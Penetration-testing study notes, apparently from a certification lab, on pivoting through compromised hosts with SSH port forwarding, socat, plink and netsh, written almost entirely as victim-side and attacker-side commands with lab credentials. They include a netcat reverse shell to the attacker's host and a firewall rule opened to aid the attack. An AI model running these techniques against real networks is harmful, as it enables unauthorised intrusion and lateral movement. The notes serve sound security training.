### SSH Tunneling - Local Port Forwarding
```
- If we have creds to another host past the initial victim on an internal network:
	- On victim in DMZ:
	- ssh -N -L 0.0.0.0:4455:172.16.235.217:445 database_admin@10.4.235.215`
		- This will now be used as a tunnel from victim port 4455 to the internal host
	- On attacker to login to and attack smb:
	- smbclient -p 445 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

### SSH Dynamic Port Forwarding
- Multiple ports
```
- In above scenario, if we have creds to the internal machine:
	- On Victim:
		- ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.21
	- On attacker:
		- Adjust /etc/proxtchains4.conf:
			- socks5 192.168.218.63 9999
		- proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```
- Nmap can scan through the tunnel with
```
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

### SSH Remote Port Forwarding
- Limited to single port output
```
- On attacker:
	- sudo systemctl start ssh
		- ss -ntplu should show we're listening on port 22
		- Set PasswordAuthentication to yes in /etc/ssh/sshd_config
- On victim:
	- ssh -N -R 127.0.0.1:2345:10.4.218.215:5432 kali@192.168.45.227
		- First IP is local machine
		- Second IP the internal machine/port we want to connect to
		- Third is our kali machine
- On attacker:
	- psql -h 127.0.0.1 -p 2345 -U postgres
```

### Remote Dynamic Port Forwarding
- Multiple ports, must be OpenSSH 7.6 or above
```
- On attacker:
	- sudo systemctl start ssh
		- ss -ntplu should show we're listening on port 22
		- Set PasswordAuthentication to yes in /etc/ssh/sshd_config
- On victim:
	- ssh -N -R 9998 kali@192.168.118.4
- On attacker:
	- proxychains nmap -vvv -sT -p 9000-9100 -Pn -n 10.4.218.64
	- proxychains ./ssh_remote_dynamic_client -i 10.4.218.64 -p 9062
```

**If this isn't working, try sshuttle if we have admin + python**

### Socat on Linux
```
- On victim:
	- socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
	- Listening on port 2345 on the victim, forwarding to host 10.4.50.215 on port 5432
- On attacker:
	- psql -h 192.168.50.63 -p 2345 -U postgres
	- Making a connection to the victim on port 2345 which will connect to the tunnel
```

### Windows
#### ssh.exe
- Often located in C:\\Windows\\System32\\OpenSSH
- Creates dynamic port forwarding
```
- On attacker:
	- suso systemctl ssh
- On victim:
	- where ssh
	- ssh -V
	- ssh -N -R 9998 kali@192.168.45.171
- On attacker:
	- ss -ntplu
	- check /etc/proxychains4.conf has: socks5 127.0.0.1 9988 at bottom
	- proxychains psql 10.4.216.50 -U postgres
	- proxychains ./ssh_exe_exercise_client.bin -i 10.4.216.215 -p 4141
```

#### plink
- CLI putty
```
- Create connection back to kali with netcat
	- Victim:
		- C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
- Run plink
	- Victim:
		- C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
			- In this instance we're opening a tunnel to an RDP port on an internal host
			- R is opening port 9833 on kali through Windows
			- Linking it to loopback 3389 will send it to the target host on that address
	- On attacker:
		- ss -ntplu to ensure port 9833 is open
		- xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

#### netsh
- Requires admin privs
```
- On victim:
	- netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<victim IP address> connectport=22 connectaddress=<target IP address>
	- "netstat -anp TCP | find "2222"" or "netsh interface portproxy show all"" to confirm listening
	- netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=<victim IP> localport=2222 action=allow
		- This pokes a hole in the firewall to facilitate attack

- On attacker:
	- sudo nmap -sS 192.168.50.64 -Pn -n -p2222
		- All traffic to port 2222 will be redirected to the target's port 22

Cleaning Up:
	- On victim:
		- netsh advfirewall firewall delete rule name="port_forward_ssh_2222
		- netsh interface portproxy del v4tov4 listenport=2222 listenaddress=<victim IP>
```